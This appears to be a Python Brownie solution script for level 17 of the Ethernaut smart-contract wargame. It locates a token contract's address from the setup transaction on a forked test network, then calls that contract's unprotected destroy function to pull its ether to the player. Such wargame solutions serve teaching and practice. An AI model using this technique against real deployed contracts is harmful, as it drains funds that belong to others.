from brownie import (
    network,
    accounts,
    config,
    interface,
    history,
    Contract,
)
from scripts.helpful_scripts import (
    get_account,
    get_new_instance,
    submit_instance,
)
from web3 import Web3


def main():
    simple_token_address = get_simple_token_address()

    player = get_account()
    instance_address = get_new_instance(level_id=17, player=player, value=Web3.toWei(0.001, "ether"))

    simple_token_contract = interface.ISimpleToken(simple_token_address)
    tx = simple_token_contract.destroy(player, {"from": player, "allow_revert": True})
    tx.wait(1)

    submit_instance(instance_address, player)

def get_simple_token_address():
    target_network = network.show_active()
    network.disconnect()
    network.connect("rinkeby-fork-dev")
    
    player = get_account()
    instance_address = get_new_instance(level_id=17, player=player, value=Web3.toWei(0.001, "ether"))

    print(f'Instance address: {instance_address}')
    print(f'Addresses of contracts created in the transaction: {history[0].new_contracts}')
    simple_token_address = history[0].new_contracts[1]
    print(f'SimpleToken address: {simple_token_address}')
    print()

    network.disconnect()
    network.connect(target_network)
    return simple_token_address

